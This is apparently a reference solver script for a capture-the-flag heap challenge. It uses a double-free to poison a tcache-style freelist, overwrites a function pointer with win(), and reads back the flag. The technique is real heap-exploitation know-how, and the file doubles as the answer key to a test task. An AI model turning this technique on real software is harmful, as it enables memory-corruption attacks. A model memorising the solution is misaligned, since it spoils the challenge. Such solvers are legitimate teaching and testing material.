"""Reference solver for heaptcache: double-free -> freelist poisoning -> hijack.

    python3 solve.py <host> <port>

The freelist behaves like a tcache bin (next-pointer stored in the freed chunk).
A double-free of the same chunk makes malloc return it twice; write the target
address (&pending.run) into it so it becomes the new freelist head, then the next
alloc returns &pending.run and our write sets pending.run = win(). Dispatch calls
it. All addresses are printed on connect (non-PIE), so no leak is needed.
"""
import re
import socket
import struct
import sys
import time

CHUNK = 32


def p64(x):
    return struct.pack("<Q", x)


def alloc(idx, data):
    payload = data + b"A" * (CHUNK - len(data))
    return b"1\n" + str(idx).encode() + b"\n" + payload[:CHUNK]


def free(idx):
    return b"2\n" + str(idx).encode() + b"\n"


def main():
    host, port = sys.argv[1], int(sys.argv[2])
    s = socket.socket()
    s.settimeout(4)
    s.connect((host, port))
    banner = b""
    try:
        while b"commands:" not in banner:
            chunk = s.recv(4096)
            if not chunk:
                break
            banner += chunk
    except socket.timeout:
        pass
    win = int(re.search(rb"win\(\) is at (0x[0-9a-fA-F]+)", banner).group(1), 16)
    target = int(re.search(rb"pending\.run is at (0x[0-9a-fA-F]+)", banner).group(1), 16)

    script = b"".join([
        alloc(0, b"A" * 8),     # get a chunk p0
        free(0),                # freelist = p0
        free(0),                # double free: *p0 = p0, freelist = p0
        alloc(1, p64(target)),  # pop p0, write *p0 = &pending.run
        alloc(2, b"B" * 8),     # pop p0, freelist becomes &pending.run
        alloc(3, p64(win)),     # pop &pending.run, write pending.run = win
        b"3\n",                 # dispatch -> win()
    ])
    s.sendall(script)
    time.sleep(0.3)
    out = b""
    s.settimeout(2)
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            out += chunk
    except socket.timeout:
        pass
    s.close()
    m = re.search(rb"WIN (flag\{[^}]*\})", out)
    print(m.group(1).decode() if m else out.decode(errors="replace"))


if __name__ == "__main__":
    main()
